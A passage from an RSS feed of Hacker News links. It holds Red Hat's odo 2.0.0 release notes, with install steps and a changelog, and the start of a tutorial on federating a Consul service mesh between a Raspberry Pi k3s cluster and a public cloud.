on <a href="mailto:support@bcast.fm">support@bcast.fm</a> to let us know how it went...</p>
                </div>
            </section></div>]]>
            </description>
            <link>https://blog.bcast.fm/podcast-guests/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579892</guid>
            <pubDate>Thu, 24 Sep 2020 15:57:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Red Hat releases 2.0.0 of Odo, a Kubernetes and OpenShift dev tool]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24579814">thread link</a>) | @twelvenmonkeys
<br/>
September 24, 2020 | https://odo.dev/blog/odo-200-ga-release/ | <a href="https://web.archive.org/web/*/https://odo.dev/blog/odo-200-ga-release/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<div>
							<p><code>2.0.0</code> of odo has been released!</p>



<h4 id="changes-to-the-default-deployment-method">Changes to the default deployment method</h4>

<p><a href="ihttps://devfile.github.io/devfile/index.html">Devfile</a> is a file format that is used as odo‚Äôs new deployment engine. Starting from <code>2.0.0</code> onwards, Source-to-Image (S2I) is no longer the default deployment method. S2I is still supported and can now be accessed with the <code>--s2i</code> flag from the command-line.</p>

<p>Learn how to deploy your first devfile using devfiles from our <a href="https://odo.dev/docs/deploying-a-devfile-using-odo/">Devfile tutorial</a>.</p>

<p>Example on how to download a starter project and deploy a devfile:</p>

<div><div><pre><code><span>$ </span>odo create nodejs <span>--starter</span>
Validation
 ‚úì  Checking devfile existence <span>[</span>22411ns]
 ‚úì  Checking devfile compatibility <span>[</span>22492ns]
 ‚úì  Creating a devfile component from registry: DefaultDevfileRegistry <span>[</span>24341ns]
 ‚úì  Validating devfile component <span>[</span>74471ns]

Starter Project
 ‚úì  Downloading starter project nodejs-starter from https://github.com/odo-devfiles/nodejs-ex.git <span>[</span>479ms]

Please use <span>`</span>odo push<span>`</span> <span>command </span>to create the component with <span>source </span>deployed

<span>$ </span>odo push

Validation
 ‚úì  Validating the devfile <span>[</span>132092ns]

Creating Kubernetes resources <span>for </span>component nodejs
 ‚úì  Waiting <span>for </span>component to start <span>[</span>5s]

Applying URL changes
 ‚úì  URL http-3000: http://http-3000-nodejs-foobar.myproject.example.com/ created

Syncing to component nodejs
 ‚úì  Checking files <span>for </span>pushing <span>[</span>1ms]
 ‚úì  Syncing files to the component <span>[</span>868ms]

Executing devfile commands <span>for </span>component nodejs
 ‚úì  Executing <span>install command</span> <span>"npm install"</span> <span>[</span>4s]
 ‚úì  Executing run <span>command</span> <span>"npm start"</span> <span>[</span>2s]

Pushing devfile component nodejs
 ‚úì  Changes successfully pushed to component
</code></pre></div></div>

<h4 id="deploying-a-custom-kubernetes-controller-with-odo">Deploying a custom Kubernetes controller with odo</h4>

<p>With the release of <code>2.0.0</code> deploying operators is now out of experimental mode.</p>

<p>Learn how to deploy your first Kubernetes custom controller from our <a href="https://odo.dev/docs/operator-hub/">Operator documentation</a>.</p>

<p>Example on how to deploy your first Operator:</p>

<div><div><pre><code><span>$ </span>odo catalog list services
  Operators available <span>in </span>the cluster
  NAME                          CRDs
  etcdoperator.v0.9.4           EtcdCluster, EtcdBackup, EtcdRestore

<span>$ </span>odo service create etcdoperator.v0.9.4/EtcdCluster
</code></pre></div></div>

<h4 id="odo-debug-is-no-longer-in-technical-preview"><code>odo debug</code> is no longer in technical preview</h4>

<p>The <code>odo debug</code> command is no longer in technical preview.</p>

<p><a href="https://odo.dev/docs/debugging-using-devfile/">Learn how to debug your component via the CLI or VSCode</a>.</p>



<h2 id="installing-odo-on-linux">Installing odo on Linux</h2>

<h3 id="binary-installation">Binary installation</h3>

<div><div><pre><code># curl -L https://mirror.openshift.com/pub/openshift-v4/clients/odo/latest/odo-linux-amd64 -o /usr/local/bin/odo
# chmod +x /usr/local/bin/odo
</code></pre></div></div>

<h2 id="installing-odo-on-macos">Installing odo on macOS</h2>

<h3 id="binary-installation-1">Binary installation</h3>

<div><div><pre><code># curl -L https://mirror.openshift.com/pub/openshift-v4/clients/odo/latest/odo-darwin-amd64 -o /usr/local/bin/odo
# chmod +x /usr/local/bin/odo
</code></pre></div></div>

<h2 id="installing-odo-on-windows">Installing odo on Windows</h2>

<h3 id="binary-installation-2">Binary installation</h3>

<ol>
  <li>
    <p>Download the latest  <a href="https://mirror.openshift.com/pub/openshift-v4/clients/odo/latest/odo-windows-amd64.exe"><code>odo.exe</code></a>   file.</p>
  </li>
  <li>
    <p>Add the location of your <code>odo.exe</code> to your <code>GOPATH/bin</code> directory.</p>
  </li>
</ol>

<h3 id="setting-the-path-variable-for-windows-10">Setting the <code>PATH</code> variable for Windows 10</h3>

<p>Edit <code>Environment Variables</code> using search:</p>

<ol>
  <li>
    <p>Click <strong>Search</strong> and type <code>env</code> or <code>environment</code>.</p>
  </li>
  <li>
    <p>Select <strong>Edit environment variables for your account</strong>.</p>
  </li>
  <li>
    <p>Select <strong>Path</strong> from the <strong>Variable</strong> section and click <strong>Edit</strong>.</p>
  </li>
  <li>
    <p>Click <strong>New</strong> and type <code>C:\go-bin</code> into the field or click    <strong>Browse</strong> and select the directory, and click <strong>OK</strong>.</p>
  </li>
</ol>

<h3 id="setting-the-path-variable-for-windows-78">Setting the <code>PATH</code> variable for Windows 7/8</h3>

<p>The following example demonstrates how to set up a path variable. Your binaries can be located in any location, but this example uses C:\go-bin as the location.</p>

<ol>
  <li>
    <p>Create a folder at <code>C:\go-bin</code>.</p>
  </li>
  <li>
    <p>Right click <strong>Start</strong> and click <strong>Control Panel</strong>.</p>
  </li>
  <li>
    <p>Select <strong>System and Security</strong> and then click <strong>System</strong>.</p>
  </li>
  <li>
    <p>From the menu on the left, select the <strong>Advanced systems settings</strong>  and click the <strong>Environment Variables</strong> button at the bottom.</p>
  </li>
  <li>
    <p>Select <strong>Path</strong> from the <strong>Variable</strong> section and click <strong>Edit</strong>.</p>
  </li>
  <li>
    <p>Click <strong>New</strong> and type <code>C:\go-bin</code> into the field or click    <strong>Browse</strong> and select the directory, and click <strong>OK</strong>.</p>
  </li>
</ol>



<p><strong>New features:</strong></p>

<ul>
  <li>implement odo describe for devfile <a href="https://github.com/openshift/odo/issues/3644">#3644</a></li>
  <li>Release 2.0.0 <a href="https://github.com/openshift/odo/pull/4021">#4021</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Move Operator Hub out of experimental mode <a href="https://github.com/openshift/odo/pull/3938">#3938</a> (<a href="https://github.com/dharmit">dharmit</a>)</li>
  <li>Implement clonePath, update source code sync location <a href="https://github.com/openshift/odo/pull/3907">#3907</a> (<a href="https://github.com/adisky">adisky</a>)</li>
</ul>

<p><strong>Code Refactoring:</strong></p>

<ul>
  <li>‚Äúodo link‚Äù help message should not check for ClusterServiceVersion support <a href="https://github.com/openshift/odo/issues/4008">#4008</a></li>
  <li>API version and schema version tests should be migrated to devfileV2 <a href="https://github.com/openshift/odo/issues/3794">#3794</a></li>
  <li>Do not check for CSV when initializing odo link command <a href="https://github.com/openshift/odo/pull/4010">#4010</a> (<a href="https://github.com/dharmit">dharmit</a>)</li>
  <li>Update odo debug ‚Äìhelp screen <a href="https://github.com/openshift/odo/pull/3963">#3963</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Clarify description of the force-build flag in help text for odo push <a href="https://github.com/openshift/odo/pull/3958">#3958</a> (<a href="https://github.com/johnmcollier">johnmcollier</a>)</li>
  <li>Switch to use project instead of namespace in env <a href="https://github.com/openshift/odo/pull/3951">#3951</a> (<a href="https://github.com/GeekArthur">GeekArthur</a>)</li>
  <li>Remove the namespace flag from odo <a href="https://github.com/openshift/odo/pull/3949">#3949</a> (<a href="https://github.com/johnmcollier">johnmcollier</a>)</li>
  <li>Migrate devfile cmd validation to validate pkg <a href="https://github.com/openshift/odo/pull/3912">#3912</a> (<a href="https://github.com/maysunfaisal">maysunfaisal</a>)</li>
  <li>Remove command group type init <a href="https://github.com/openshift/odo/pull/3898">#3898</a> (<a href="https://github.com/adisky">adisky</a>)</li>
</ul>

<p><strong>Bugs:</strong></p>

<ul>
  <li>‚Äúodo link -h‚Äù shows same message for 3.x &amp; 4.x clusters <a href="https://github.com/openshift/odo/issues/3992">#3992</a></li>
  <li>make goget-tools fails due to go mod dependency <a href="https://github.com/openshift/odo/issues/3983">#3983</a></li>
  <li>Handle edge case when index file is commented in .gitignore <a href="https://github.com/openshift/odo/issues/3961">#3961</a></li>
  <li>Java component build execution requires pom.xml <a href="https://github.com/openshift/odo/issues/3943">#3943</a></li>
  <li>default registry not initialized when user already has a preference.yaml file <a href="https://github.com/openshift/odo/issues/3940">#3940</a></li>
  <li><code>odo url create</code> shouldn‚Äôt require a port if only one port exists in the devfile <a href="https://github.com/openshift/odo/issues/3923">#3923</a></li>
  <li><code>odo push</code> with alternate ‚Äìrun-command should push complete file set upon new pod creation <a href="https://github.com/openshift/odo/issues/3918">#3918</a></li>
  <li>converting s2i items to devfile items does not set the Endpoint‚Äôs name properly <a href="https://github.com/openshift/odo/issues/3910">#3910</a></li>
  <li>Unexpected EOF during watch stream event decoding, watch channel was closed. <a href="https://github.com/openshift/odo/issues/3905">#3905</a></li>
  <li>odo debug serial tests script panic out <a href="https://github.com/openshift/odo/issues/3897">#3897</a></li>
  <li>Default URL does not propagate to <code>.odo/env/env.yaml</code> and you cannot delete it. <a href="https://github.com/openshift/odo/issues/3893">#3893</a></li>
  <li>Breaking component create without exposing port <a href="https://github.com/openshift/odo/issues/3882">#3882</a></li>
  <li>odo registry list causes panic if preference has not been setup <a href="https://github.com/openshift/odo/issues/3842">#3842</a></li>
  <li>odo watch goes into infinite push loop if ignore flag is used <a href="https://github.com/openshift/odo/issues/3819">#3819</a></li>
  <li>‚Äòodo create‚Äô should properly validate devfiles <a href="https://github.com/openshift/odo/issues/3778">#3778</a></li>
  <li>context flag does not work with devfile url create <a href="https://github.com/openshift/odo/issues/3767">#3767</a></li>
  <li>odo log is unusable for multi container components <a href="https://github.com/openshift/odo/issues/3711">#3711</a></li>
  <li>‚Äúodo registry add‚Äù adds registry for invalid url in devfileV2 <a href="https://github.com/openshift/odo/issues/3451">#3451</a></li>
  <li>Prints help message based on backend cluster <a href="https://github.com/openshift/odo/pull/3993">#3993</a> (<a href="https://github.com/dharmit">dharmit</a>)</li>
  <li>s2i component fix: use Config instead of ContainerConfig for port detection <a href="https://github.com/openshift/odo/pull/3957">#3957</a> (<a href="https://github.com/kadel">kadel</a>)</li>
  <li>3923- url creation with optional port flag <a href="https://github.com/openshift/odo/pull/3950">#3950</a> (<a href="https://github.com/yangcao77">yangcao77</a>)</li>
  <li>Add mandatory file ignores when using ‚Äìignore flag <a href="https://github.com/openshift/odo/pull/3942">#3942</a> (<a href="https://github.com/maysunfaisal">maysunfaisal</a>)</li>
  <li>Fix default registry support <a href="https://github.com/openshift/odo/pull/3941">#3941</a> (<a href="https://github.com/GeekArthur">GeekArthur</a>)</li>
  <li>Update s2i image from library for ppc64le <a href="https://github.com/openshift/odo/pull/3939">#3939</a> (<a href="https://github.com/sarveshtamba">sarveshtamba</a>)</li>
  <li>update s2i to devfile conversion as per new url design <a href="https://github.com/openshift/odo/pull/3930">#3930</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>Add test-case for validating devfiles on component create <a href="https://github.com/openshift/odo/pull/3908">#3908</a> (<a href="https://github.com/johnmcollier">johnmcollier</a>)</li>
  <li>Improve URL format validation <a href="https://github.com/openshift/odo/pull/3900">#3900</a> (<a href="https://github.com/GeekArthur">GeekArthur</a>)</li>
  <li>implement odo describe for devfile <a href="https://github.com/openshift/odo/pull/3843">#3843</a> (<a href="https://github.com/metacosm">metacosm</a>)</li>
</ul>

<p><strong>Tests:</strong></p>

<ul>
  <li>Test failures while running <code>test-cmd-push</code> test suite on ppc64le <a href="https://github.com/openshift/odo/issues/3539">#3539</a></li>
  <li>Test failures while running <code>test-cmd-storage</code> test suite on ppc64le <a href="https://github.com/openshift/odo/issues/3531">#3531</a></li>
</ul>

<p><strong>Documentation &amp; Discussions:</strong></p>

<ul>
  <li>Update installation page to include instructions for VSCode / IDE‚Äôs <a href="https://github.com/openshift/odo/issues/3970">#3970</a></li>
  <li>Update docs according to schema changes in the command and component struct <a href="https://github.com/openshift/odo/issues/3925">#3925</a></li>
  <li>Help for <code>odo push -f</code> should explain that the full set of project source is pushed to the container <a href="https://github.com/openshift/odo/issues/3919">#3919</a></li>
  <li>Make the <code>odo.dev</code> front page documentation simpler <a href="https://github.com/openshift/odo/issues/3887">#3887</a></li>
  <li>Add debug examples for ‚Äúodo debug -h‚Äù <a href="https://github.com/openshift/odo/issues/3871">#3871</a></li>
  <li>Remove technology preview feature for debug command <a href="https://github.com/openshift/odo/issues/3869">#3869</a></li>
  <li>Update devfile ‚Äúodo.dev‚Äù doc <a href="https://github.com/openshift/odo/issues/3868">#3868</a></li>
  <li>Documentation for Operator Hub integration in v2 <a href="https://github.com/openshift/odo/issues/3810">#3810</a></li>
  <li>Document on converting s2i to devfile <a href="https://github.com/openshift/odo/issues/3749">#3749</a></li>
  <li>Adds a blog folder <a href="https://github.com/openshift/odo/pull/4003">#4003</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Document odo and Operator Hub integration <a href="https://github.com/openshift/odo/pull/3982">#3982</a> (<a href="https://github.com/dharmit">dharmit</a>)</li>
  <li>Add instructions on how to install VSCode plugin <a href="https://github.com/openshift/odo/pull/3977">#3977</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Update installation page to indicate beta-1 <a href="https://github.com/openshift/odo/pull/3960">#3960</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Remove references to Docker support <a href="https://github.com/openshift/odo/pull/3954">#3954</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Updates docs to use the new schema changes for commands and components <a href="https://github.com/openshift/odo/pull/3928">#3928</a> (<a href="https://github.com/mik-dass">mik-dass</a>)</li>
  <li>Update commands ouputs in docs. <a href="https://github.com/openshift/odo/pull/3927">#3927</a> (<a href="https://github.com/boczkowska">boczkowska</a>)</li>
</ul>

<p><strong>Closed issues:</strong></p>

<ul>
  <li>Determine if we want to keep Docker support in experimental mode, or disable it <a href="https://github.com/openshift/odo/issues/3955">#3955</a></li>
  <li>rename ‚Äìnamespace flag in odo push to ‚Äìproject <a href="https://github.com/openshift/odo/issues/3948">#3948</a></li>
  <li>rename odo env variable namespace to project <a href="https://github.com/openshift/odo/issues/3947">#3947</a></li>
  <li>Test failures while running <code>test-integration</code>  and <code>test-e2e-all</code> test suite on ppc64le <a href="https://github.com/openshift/odo/issues/3945">#3945</a></li>
  <li>‚Äúunknown flag: ‚Äìs2i‚Äù while running odo test suite ‚Äòtest-generic‚Äô on ppc64le <a href="https://github.com/openshift/odo/issues/3934">#3934</a></li>
  <li>odo <code>make</code> commands fail on ppc64le after latest changes. <a href="https://github.com/openshift/odo/issues/3891">#3891</a></li>
  <li>Downstream release of the odo cli <a href="https://github.com/openshift/odo/issues/3852">#3852</a></li>
  <li>clonePath should be supported in odo <a href="https://github.com/openshift/odo/issues/3729">#3729</a></li>
  <li>Move devfile command validation to validate pkg <a href="https://github.com/openshift/odo/issues/3703">#3703</a></li>
  <li><code>make test</code> throws ‚ÄúErrorf format %w has unknown verb w‚Äù error on ppc64le with latest master <a href="https://github.com/openshift/odo/issues/3607">#3607</a></li>
  <li>Move Operator Hub integration out of Experimental mode <a href="https://github.com/openshift/odo/issues/3595">#3595</a></li>
  <li>Move container image used in springboot devfile to some odo owned image repository <a href="https://github.com/openshift/odo/issues/3578">#3578</a></li>
  <li>Move the devfile feature set out of the experimental mode <a href="https://github.com/openshift/odo/issues/3550">#3550</a></li>
  <li>JSON  / machine output support for Devfile Components <a href="https://github.com/openshift/odo/issues/3521">#3521</a></li>
  <li>Component push throws error of ‚ÄúWaiting for component to start‚Äù on ppc64le <a href="https://github.com/openshift/odo/issues/3497">#3497</a></li>
  <li>odo project create throws error of connection refused on ppc64le <a href="https://github.com/openshift/odo/issues/3491">#3491</a></li>
  <li>Tests for devfiles in odo devfile registry <a href="https://github.com/openshift/odo/issues/3378">#3378</a></li>
</ul>

<p><strong>Merged pull requests:</strong></p>

<ul>
  <li>vendor: switch location of goautoneg to github <a href="https://github.com/openshift/odo/pull/3984">#3984</a> (<a href="https://github.com/kadel">kadel</a>)</li>
  <li>Remove url describe command <a href="https://github.com/openshift/odo/pull/3981">#3981</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>odo list follow up implementation <a href="https://github.com/openshift/odo/pull/3964">#3964</a> (<a href="https://github.com/girishramnani">girishramnani</a>)</li>
  <li>Fix test failure caused by updating springboot devfile <a href="https://github.com/openshift/odo/pull/3946">#3946</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>apiVersion test migrated to devfileV2 <a href="https://github.com/openshift/odo/pull/3920">#3920</a> (<a href="https://github.com/anandrkskd">anandrkskd</a>)</li>
  <li>add test for odo url create ‚Äìcontext flag <a href="https://github.com/openshift/odo/pull/3917">#3917</a> (<a href="https://github.com/girishramnani">girishramnani</a>)</li>
  <li>Update springboot devfile <a href="https://github.com/openshift/odo/pull/3799">#3799</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>Fix odo log for multi containers devfile <a href="https://github.com/openshift/odo/pull/3735">#3735</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>Make Devfile the default deployment mechanism <a href="https://github.com/openshift/odo/pull/3705">#3705</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
</ul>

						</div><!-- /.content -->
					</div></div>]]>
            </description>
            <link>https://odo.dev/blog/odo-200-ga-release/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579814</guid>
            <pubDate>Thu, 24 Sep 2020 15:51:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Consul Service Mesh Across a Private Raspberry Pi and a Public Cloud]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579527">thread link</a>) | @jsiebens
<br/>
September 24, 2020 | https://johansiebens.dev/posts/2020/09/consul-service-mesh-across-a-private-raspberry-pi-and-a-public-cloud/ | <a href="https://web.archive.org/web/*/https://johansiebens.dev/posts/2020/09/consul-service-mesh-across-a-private-raspberry-pi-and-a-public-cloud/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

<figure>
    <img src="https://johansiebens.dev/uploads/alina-grubnyak-ZiQkhI7417A-unsplash-banner.png" alt="photo by Alina Grubnyak on Unsplash"> <figcaption>
            <p>photo by <a href="https://unsplash.com/@alinnnaaaa?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank">Alina Grubnyak</a> on <a href="https://unsplash.com/" target="_blank">Unsplash</a></p>
        </figcaption>
</figure>


<p>In my <a href="https://johansiebens.dev/posts/2020/09/scale-out-your-raspberry-pi-nomad-cluster-to-the-cloud/" target="_blank">previous post</a>, I wrote about a way to expand a Consul and Nomad cluster in a private lab to a public cloud. All the nodes, a Raspberry Pi on-premise, or a VM in a public cloud were sharing the same private network, provided by Tailscale, and workloads running on Nomad are spread across both environments. Everything is working well, but after a few days running this setup, I wasn‚Äôt sure if using Tailscale is the right approach for scaling out a local Nomad cluster to the cloud. Don‚Äôt get me wrong, I still love Tailscale; it is easy to install and to use, and is a perfect fit when you want to access some servers from everywhere. But in a more dynamic environment, where nodes are more cattle instead of pets, can come and go when required, other solutions may be better.</p>

<p>The reason for using Tailscale at first, is because all the nodes in a Consul cluster should be able to connect. In terms of Consul, I‚Äôve built a single datacenter with nodes running on-premise and in the cloud, which may seem a little bit odd when you think about it.</p>

<figure><a href="https://consul.io/">
    <img src="https://johansiebens.dev/uploads/0006/Consul_VerticalLogo_FullColor_RGB_small.png" width="150"> </a>
</figure>


<p>In this post, we have a look at a completely different approach to expand a cluster running on a Raspberry Pi to the cloud with Consul Connect and its advanced features like Mesh Gateways.</p>

<p>Consul Connect provides service-to-service connection authorization and encryption using mutual Transport Layer Security (TLS).<br>
Applications can use sidecar proxies in a service mesh configuration to establish TLS connections for inbound and outbound connections without being aware of Connect at all.</p>

<p>Consul has already for a long time support for joining multiple datacenters which operate independently and only communicate over the WAN on port 8302.</p>

<p>With WAN federation via mesh gateways allows for Consul servers in different datacenters to be federated exclusively through mesh gateways, without the need that all Consul servers in every datacenter must be able to reach each other over their WAN-advertised network address.</p>

<figure>
    <img src="https://johansiebens.dev/uploads/0006/k8s-mesh-gateway.png" alt="Secure Service Mesh Communication Across Kubernetes Clusters (source: HashiCorp Learn)"> <figcaption>
            <p>Secure Service Mesh Communication Across Kubernetes Clusters (source: <a href="https://learn.hashicorp.com/tutorials/consul/kubernetes-mesh-gateways" target="_blank">HashiCorp Learn</a>)</p>
        </figcaption>
</figure>


<p>First, we deploy a Consul cluster, with WAN federation via mesh gateway enabled, on k3s running on a Raspberry Pi. That installation will act as our primary datacenter.<br>
Next, we build a second datacenter on a public cloud provider and join this second and the primary datacenter.<br>
Finally, some services we will deploy a multi-tier application across the clusters, to demonstrate the inter-datacenter communication.</p>

<p>How to achieve this, is already explained in detail in the <a href="https://learn.hashicorp.com/tutorials/consul/kubernetes-mesh-gateways" target="_blank">Secure Service Mesh Communication Across Kubernetes Clusters</a> tutorial from HashiCorp.</p>

<p>Yet, there are some specific steps to take when using a Raspberry Pi in a private network.</p>

<p><strong>Envoy Proxy on a Raspberry Pi</strong></p>

<figure><a href="https://www.envoyproxy.io/">
    <img src="https://johansiebens.dev/uploads/0006/envoy-proxy-logo.png" width="100"> </a>
</figure>


<p>A Connect-aware proxy enables unmodified applications to use Connect. Consul includes its own built-in L4 proxy and has first class support for Envoy.<br>
Currently, Envoy is the only proxy with mesh gateway capabilities in Consul.</p>

<p>Unfortunately, at the time of writing, there are no Envoy binaries or Docker images available for the ARM architecture.<br>
They are working on supporting arm64, but for the time being, you have to build Envoy for arm64 yourself, or use the binary and Docker image that I‚Äôve build already.</p>

<p><strong>Exposing private service to the public</strong></p>

<figure><a href="https://inlets.dev/">
    <img src="https://johansiebens.dev/uploads/inlets-pro-purple.png" width="100"> </a>
</figure>


<p>As the Raspberry Pi is running in an internal network, we have to find a way to expose the mesh gateway to the outside world, so that other datacenters can connect to the private cluster.<br>
In <a href="https://johansiebens.dev/posts/2020/08/argo-cd-for-your-private-raspberry-pi-k3s-cluster/" target="_blank">another post</a>, I‚Äôve already mentioned <a href="https://inlets.dev/" target="_blank">inlets</a>, a cloud-native tunnel.<br>
Now that we are deploying are service mesh on a lightweight Kubernetes distribution, <a href="https://k3s.io/" target="_blank">k3s</a>, we can use the <code>inlets-operator</code> to automate the creation of an exit-node for a Kubernetes LoadBalancer service.</p>

<p><em>‚ÄúThe operator detects Services of type LoadBalancer, and then creates a Tunnel Custom Resource. Its next step is to provision a small VM with a public IP on the public cloud, where it will run the inlets tunnel server. Then an inlets client is deployed as a Pod within your local cluster, which connects to the server and acts like a gateway to your chosen local service.‚Äù</em></p>

<h2 id="prerequisites">Prerequisites</h2>

<p>For this tutorial, I have prepared the following:</p>

<ul>
<li><p>a DigitalOcean Access Token</p></li>

<li><p>a Kubernetes cluster running on <a href="https://digitalocean.com/" target="_blank">DigitalOcean</a> (any other provider is also ok)</p></li>

<li><p>an inlets PRO license</p></li>

<li><p>tools installed locally:</p>

<ul>
<li>kubectl, configured with one context for the cluster on DigitalOcean<br></li>
<li><a href="https://helm.sh/" target="_blank">helm</a> (version 3), the package manager for Kubernetes<br></li>
<li><a href="https://github.com/alexellis/k3sup" target="_blank">k3sup</a>, light-weight utility to get from zero to KUBECONFIG with k3s on any local or remote VM.<br></li>
<li><a href="https://github.com/alexellis/arkade" target="_blank">arkade</a>, a Golang CLI with strongly-typed flags to install Helm charts and apps to your cluster in one command.</li>
</ul></li>

<li><p>a Raspberry Pi, running Ubuntu 20.04 64bit, with a proper hostname (<code>orion-rpi4-01</code>) and IP address (<code>192.168.0.51</code>)</p></li>
</ul>

<blockquote>
<p><strong>Security Warning</strong> This tutorial is not for production use. Although we enable gossip and TLS encryption, the Helm chart used, installs an configuration of Consul without ACL enabled.</p>
</blockquote>

<h2 id="building-the-primary-datacenter-a-raspberry-pi">Building the primary datacenter a Raspberry Pi</h2>

<h3 id="create-a-k3s-cluster">Create a k3s cluster</h3>

<p>The easiest way to get a k3s cluster ready, is by using the <code>k3sup</code> tool:</p>
<div><pre><code data-lang="bash">$ k3sup install <span>\
</span><span></span>  --ip <span>192</span>.168.0.51 <span>\
</span><span></span>  --user ubuntu <span>\
</span><span></span>  --context orion-rpi4 <span>\
</span><span></span>  --merge <span>\
</span><span></span>  --k3s-extra-args <span>'--no-deploy servicelb --no-deploy traefik'</span></code></pre></div>
<p>By default, k3s comes with a load balancer, known as Klipper Load Balancer, and Traefik as an Ingress Controller.<br>
In our case we are going to let the <code>inlets-operator</code> handle LoadBalancer services, and we don‚Äôt need Traefik for the moment, hence the two <code>--no-deploy</code> flags to disable those features.<br>
After executing those two commands, a small single node k3s cluster is ready to use, and our <code>kubeconfig</code> is updated with a new context pointing to this cluster.</p>

<p><strong>Note:</strong> for this demo, I only took a single Raspberry Pi, but if you have some other Raspberry Pis available, you could always add additional nodes to this k3s cluster, e.g.</p>
<div><pre><code data-lang="bash">$ k3sup join --ip <span>192</span>.168.0.52 --server-ip <span>192</span>.168.0.51 --user ubuntu
$ k3sup join --ip <span>192</span>.168.0.53 --server-ip <span>192</span>.168.0.51 --user ubuntu</code></pre></div>
<p>Now switch to this new context and verify if the cluster is available.</p>
<div><pre><code data-lang="bash">$ kubectl config use-context orion-rpi4 
Switched to context <span>"orion-rpi4"</span>.
$ kubectl get nodes --context orion-rpi4 -o wide
NAME            STATUS   ROLES    AGE   VERSION        INTERNAL-IP    EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION     CONTAINER-RUNTIME
orion-rpi4-01   Ready    master   54s   v1.18.6+k3s1   <span>192</span>.168.0.51   &lt;none&gt;        Ubuntu <span>20</span>.04.1 LTS   <span>5</span>.4.0-1015-raspi   containerd://1.3.3-k3s2</code></pre></div>
<h3 id="install-inlets-operator-with-arkade">Install inlets-operator with arkade</h3>

<p>Using arkade, we can install the <code>inlets-operator</code> using a single command, arkade runs against any Kubernetes cluster.</p>
<div><pre><code data-lang="bash">$ arkade install inlets-operator <span>\
</span><span></span> --provider digitalocean <span>\
</span><span></span> --token-file $HOME/do-access-token <span>\
</span><span></span> --license-file $HOME/inlets-pro-license.txt</code></pre></div>
<p>It takes just a few seconds until the operator pod is running.</p>
<div><pre><code data-lang="bash">$ kubectl get pods -n kube-system --selector<span>=</span>app.kubernetes.io/name<span>=</span>inlets-operator
NAME                               READY   STATUS    RESTARTS   AGE
inlets-operator-7648d7477f-2dghh   <span>1</span>/1     Running   <span>0</span>          112s</code></pre></div>
<p>From now on, every Kubernetes service of type LoadBalancer we create gets a public IP address on DigitalOcean, making the services accessible from the outside world via an inlets PRO tunnel.</p>

<h3 id="install-consul-and-mesh-gateway">Install Consul and Mesh Gateway</h3>

<p>As mentioned earlier, the steps that follow are pretty much the same as explained in the <a href="https://learn.hashicorp.com/tutorials/consul/kubernetes-mesh-gateways" target="_blank">tutorial</a> available at the HashiCorp Learn website.</p>

<p><strong>HashiCorp Helm Chart</strong></p>

<p>First, we add the HashiCorp Helm chart.</p>
<div><pre><code data-lang="bash">$ helm repo add hashicorp https://helm.releases.hashicorp.com
<span>"hashicorp"</span> has been added to your repositories</code></pre></div>
<p>Second, create a consul namespace and a secret with a gossip encryption key</p>
<div><pre><code data-lang="bash">$ kubectl create namespace consul
$ kubectl create secret generic -n consul consul-gossip-encryption-key --from-literal<span>=</span>key<span>=</span><span>$(</span>consul keygen<span>)</span></code></pre></div>
<p>Next, prepare a values.yaml file for our Consul deployment. With this configuration we will:</p>

<ul>
<li>enable gossip encryption<br></li>
<li>enable TLS encryption (required by the mesh gateway)<br></li>
<li>enable Consul Connect<br></li>
<li>enable a Mesh Gateway<br></li>
<li>enable WAN Federation<br></li>
<li>override the default Envoy image with an image compatible with arm64</li>
</ul>
<div><pre><code data-lang="yaml">global:
  name: consul
  datacenter: orion-rpi4
  image: consul:<span>1.8</span>.<span>3</span>
  imageK8S: hashicorp/consul-k8s:<span>0.18</span>.<span>1</span>
  imageEnvoy: jsiebens/envoy-arm64:<span>1.13</span>.<span>3</span>
  gossipEncryption:
    secretName: consul-gossip-encryption-key
    secretKey: key
  tls:
    enabled: <span>true</span>
  federation:
    enabled: <span>true</span>
    createFederationSecret: <span>true</span>

server:
  replicas: <span>1</span>
  bootstrapExpect: <span>1</span>
  storage: 5Gi

connectInject:
  enabled: <span>true</span>
  imageEnvoy: jsiebens/envoy-arm64:<span>1.13</span>.<span>3</span>

meshGateway:
  enabled: <span>true</span>
  replicas: <span>1</span>
  imageEnvoy: jsiebens/envoy-arm64:<span>1.13</span>.<span>3</span></code></pre></div>
<p>Notice the <code>createFederationSecret</code> entry. This should only be set in this primary datacenter. Later in this tutorial, we export the secret and copy it into the secondary datacenter. This allows the secondary datacenter to automatically negotiate WAN federation with the primary.</p>

<p>Finally, use <code>helm</code> to install Consul with the <code>hashicorp/consul</code> chart.</p>
<div><pre><code data-lang="bash">$ helm install --namespace consul --values orion-rpi4-values.yaml consul hashicorp/consul --wait</code></pre></div>
<p>This command will wait until everything is up and running, which may take a few minutes depending on your environment. When it finishes, we can have a look what is created:</p>
<div><pre><code data-lang="bash">$ kubectl get services,pods -n consul
NAME                                  TYPE           CLUSTER-IP      EXTERNAL-IP      PORT<span>(</span>S<span>)</span>                                                                   AGE
